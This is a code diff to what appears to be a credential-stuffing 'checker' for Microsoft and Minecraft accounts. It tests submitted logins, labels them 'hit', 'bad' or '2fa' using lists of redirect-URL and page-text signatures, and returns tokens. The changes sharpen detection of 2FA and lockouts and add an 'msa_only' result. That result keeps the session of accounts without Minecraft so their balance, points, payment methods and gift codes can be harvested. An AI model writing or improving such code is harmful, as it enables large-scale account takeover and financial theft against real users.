@@ -48,24 +48,46 @@ RE_UAID = re.compile(r'(?<="uaid" value=").+?(?=")')
 RE_ACTION_FMHF = re.compile(r'(?<=id="fmHF" action=").+?(?=")')
 RE_RETURN_URL = re.compile(r'(?<="recoveryCancel":\{"returnUrl":").+?(?=",)')
 
-TWOFA_SIGNATURES = (
-    "recover?mkt",
+# Signatures that indicate a true 2FA / additional verification challenge.
+# We check the *redirect URL* (where Microsoft sent us) — not page text — so a
+# stray "Forgot password?" link in the footer doesn't get misclassified.
+TWOFA_URL_SIGNATURES = (
     "account.live.com/identity/confirm",
-    "Email/Confirm",
-    "/Abuse?mkt=",
+    "login.live.com/Email/Confirm",
+    "login.live.com/recover",
+    "login.live.com/abuse",
+    "account.live.com/abuse",
+    "login.live.com/proofs",
+)
+# These can appear as fallbacks in the body when the URL didn't redirect.
+TWOFA_BODY_SIGNATURES = (
+    "Help us protect your account",
+    "This sign-in attempt looks suspicious",
+    "Verify your identity",
+    "Use your Microsoft Authenticator app",
+    "Approve sign in request",
 )
 HARD_FAIL_SIGNATURES = (
     "password is incorrect",
     "account doesn't exist",
+    "that microsoft account doesn't exist",
+    "sign in to your microsoft account",
     "tried to sign in too many times",
-    "help us protect your account",
+    "sign-in is blocked",
 )
 
 
 @dataclass
 class AuthResult:
-    status: str  # "hit" | "bad" | "2fa" | "error"
+    # "hit"      – MSA + Xbox + Minecraft access token all succeeded
+    # "msa_only" – MSA login worked but the account has no Xbox/MC link.
+    #              Still useful: balance, points, payment methods, gift codes.
+    # "bad"      – credentials rejected
+    # "2fa"      – 2-factor / additional verification required
+    # "error"    – transient failure, retried but never resolved
+    status: str
     detail: str = ""
+    msa_token: Optional[str] = None
     mc_token: Optional[str] = None
     xbox_token: Optional[str] = None
     uhs: Optional[str] = None
@@ -112,10 +134,11 @@ def _submit_credentials(
 
     text = r.text
     text_lc = text.lower()
+    final_url = r.url
 
     # Token in fragment of redirect URL → success
-    if "#" in r.url and r.url != OAUTH_URL:
-        token = parse_qs(urlparse(r.url).fragment).get("access_token", [None])[0]
+    if "#" in final_url and final_url != OAUTH_URL:
+        token = parse_qs(urlparse(final_url).fragment).get("access_token", [None])[0]
         if token:
             return "hit", token
 
@@ -138,11 +161,18 @@ def _submit_credentials(
             token = parse_qs(urlparse(fin.url).fragment).get("access_token", [None])[0]
             if token:
                 return "hit", token
-        except Exception:
-            pass
+        except Exception as exc:
+            log.debug("cancel?mkt extraction failed: %s", exc)
+        # The cancel?mkt branch is a soft bounce — never a 2FA. Retry instead.
+        return "retry", None
 
-    if any(sig in text for sig in TWOFA_SIGNATURES):
+    # 2FA detection: prefer the redirect URL over body text to cut false positives
+    final_url_lc = final_url.lower()
+    if any(sig in final_url_lc for sig in TWOFA_URL_SIGNATURES):
         return "2fa", None
+    if any(sig in text for sig in TWOFA_BODY_SIGNATURES):
+        return "2fa", None
+
     if any(sig in text_lc for sig in HARD_FAIL_SIGNATURES):
         return "bad", None
     return "retry", None
@@ -247,15 +277,17 @@ def authenticate(
 
         xbl_token, uhs, mc_token = _xbox_xsts_minecraft(session, token)
         if not mc_token:
-            # Token without an Xbox profile is still technically a hit but has
-            # no Minecraft entitlement — treat as bad for simplicity.
+            # Valid MSA, just no Xbox/Minecraft profile linked. We still keep
+            # the session so MS extras (balance/points/payments/gift codes)
+            # can be captured from the same login cookies.
             return AuthResult(
-                "bad",
-                "Xbox/Minecraft token exchange failed (no Minecraft account)",
+                status="msa_only", msa_token=token,
+                xbox_token=xbl_token, uhs=uhs, session=session,
+                detail="No Minecraft entitlement",
             )
         return AuthResult(
-            status="hit", mc_token=mc_token, xbox_token=xbl_token, uhs=uhs,
-            session=session,
+            status="hit", msa_token=token, mc_token=mc_token,
+            xbox_token=xbl_token, uhs=uhs, session=session,
         )
 
     return AuthResult("error", last_detail or "unknown auth failure")
